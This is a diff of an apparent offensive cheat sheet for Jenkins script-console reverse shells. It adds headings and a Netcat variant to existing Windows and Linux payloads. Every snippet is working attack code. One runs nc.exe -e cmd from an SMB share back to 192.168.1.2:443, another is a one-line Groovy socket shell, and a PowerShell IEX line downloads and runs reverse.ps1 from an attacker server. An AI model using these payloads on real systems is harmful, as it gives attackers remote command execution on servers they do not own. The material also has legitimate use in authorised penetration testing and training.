@@ -389,10 +389,21 @@
   
   # <kbd>Jenkins Windows</kbd> 
   
+  # <kbd>Netcat (Method 1)</kbd>
+  
+  ```cmd
+  cmd = "\\\\192.168.1.2\\a\\nc.exe -e cmd 192.168.1.2 443"
+  cmd.execute().text
+  ```
+  
+  # <kbd>Netcat (Method 2)</kbd>
+  
   ```cmd
   println "\\\\192.168.1.2\\a\\nc.exe -e cmd 192.168.1.2 443" .execute().text
   ```
-   
+  
+  # <kbd>CMD</kbd>
+  
   ```cmd
   String host="192.168.1.2";
   int port=443;
@@ -400,13 +411,17 @@
   Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
   ```
   
+  # <kbd>PowerShell</kbd>
+  
   ```cmd
   command = "powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2:8000/reverse.ps1')"
   println(command.execute().text) 
   ```
   
   # <kbd>Jenkins Linux</kbd>
-   
+  
+  # <kbd>Bash</kbd>
+  
   ```cmd
   String host="192.168.1.2";
   int port=443;
